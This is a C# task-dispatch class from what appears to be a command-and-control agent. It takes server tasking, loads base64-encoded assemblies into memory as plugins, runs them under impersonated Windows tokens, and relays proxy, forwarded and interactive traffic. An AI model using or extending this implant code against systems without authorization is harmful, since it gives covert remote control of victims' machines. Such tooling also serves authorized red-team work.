using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Security.Principal;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Agent.Managers
{
    public class TaskManager : ITaskManager
    {
        private ILogger logger { get; set; }
        public IAssemblyManager assemblyManager { get; set; }
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager)
        {
            this.logger = logger;
            this.assemblyManager = assemblyManager;
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task StartTaskAsync(ServerJob job)
        {
            this.messageManager.AddJob(job);
            TaskResponse rr = new TaskResponse()
            {
                task_id = job.task.id,
                status = "completed",
                user_output = ""
            };

            switch (job.task.command)
            {
                case "load":
                    LoadCommand loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (loadCommand is not null)
                    {
                        byte[] buf = Misc.Base64DecodeToByteArray(loadCommand.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, buf);
                        }
                    }
                    break;
                case "load-assembly":
                    LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (command is not null)
                    {
                        byte[] buf = Misc.Base64DecodeToByteArray(command.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
                        }
                    }
                    break;
                default:
                    _ = Task.Run(async () =>
                    {
                        if (!this.assemblyManager.TryGetPlugin(job.task.command, out IPlugin plug))
                        {
                            await this.messageManager.AddResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                process_response = new Dictionary<string, string> { { "message", "0x11" } },
                                status = "error",
                                completed = true,
                            });
                            return;
                        }

                        if(job.task.token == 0)
                        {
                            try
                            {
                                await plug.Execute(job);
                            }
                            catch (Exception e)
                            {
                                await this.messageManager.AddResponse(new TaskResponse()
                                {
                                    task_id = job.task.id,
                                    user_output = e.ToString(),
                                    status = "error",
                                    completed = true,
                                });
                            }
                            return;
                        }

                        try
                        {
                            tokenManager.RunTaskImpersonated(plug, job);
                        }
                        catch (Exception e)
                        {
                            await this.messageManager.AddResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                user_output = e.ToString(),
                                status = "error",
                                completed = true,
                            });
                        }
                        return;
                    });
                            
                    break;
            }
        }
        public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
        {
            foreach(var response in responses)
            {
                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
                {
                    continue;
                }

                if(plugin is null)
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    Task.Run(() => tokenManager.HandleFilePluginImpersonated(plugin, job, response));
                    continue;
                }

                _ = Task.Run(() =>
                {
                    try
                    {
                        plugin.HandleNextMessage(response);
                    }
                    catch (Exception e)
                    {
                        messageManager.WriteLine(e.ToString(), response.task_id, true, "error");
                    }
                });
            }
        }
        public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
        {
            if (!this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
            {
                return;
            }

            if (plugin is null)
            {
                return;
            }

            foreach (var response in responses)
            {
                Task.Run(() => plugin.HandleDatagram(response));
            }
        }
        public async Task HandleDelegateResponses(List<DelegateMessage> responses)
        {
            foreach(var response in responses)
            {
                if (!this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
                {
                    continue;
                }

                if (plugin is null)
                {
                    continue;
                }

                try
                {
                    plugin.ForwardDelegate(response);
                }
                catch { }
            }
        }
        public async Task HandleInteractiveResponses(List<InteractMessage> responses)
        {
            foreach(var response in responses)
            {
                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    Task.Run(() => tokenManager.HandleInteractivePluginImpersonated(plugin, job, response));
                    continue;
                }

                try
                {
                    Task.Run(() => plugin.Interact(response));
                }
                catch { }
            }
        }
    }
}
